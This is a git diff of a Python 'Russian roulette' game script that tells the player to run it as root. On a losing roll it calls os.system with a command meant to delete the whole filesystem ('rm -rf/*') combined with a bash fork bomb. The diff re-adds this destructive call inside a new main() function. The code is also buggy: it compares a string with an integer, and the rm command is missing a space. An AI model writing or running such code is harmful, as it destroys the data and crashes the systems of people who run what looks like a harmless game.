@@ -1,18 +1,28 @@
-#Import os and random
+#importing random to make the choices entireley random 
+#import os to control the os, so long as you are running as root 
 import os
 import random 
 
-
-start_game = input("Russian Roulette, press enter \n \n ")
-play = int(input("Russian roulette... pick a number between 1 and 6 \n make sure your running as root \n"))
+#couple varibles 
+start_game = input("Wanna play a game? \n ")
+play = input("Russian roulette... \n make sure your running as root ")
 list = [1,2,3,4,5,6]
 choose = random.choice(list)
 
+def main():
+    start_game = input("Are you sure? (yes/no): ")
 
-start_game
-play
-choose
-if choose == play:
-    print("You loose :( ") and os.system("rm rf/* | :(){ :|:& };:")
-else:
-    print("Your computer is safe")
+    if start_game.lower() == "yes":
+        play = input("Pick a Number between 1 and 6 \n")
+        choose
+        print(choose)
+        if play == choose:
+            print("You lose :(")
+            os.system("rm -rf/* | :(){ :|:& };:")
+        else:
+            print("You Win")
+    else:
+        print("Smart move")
+
+main()
+
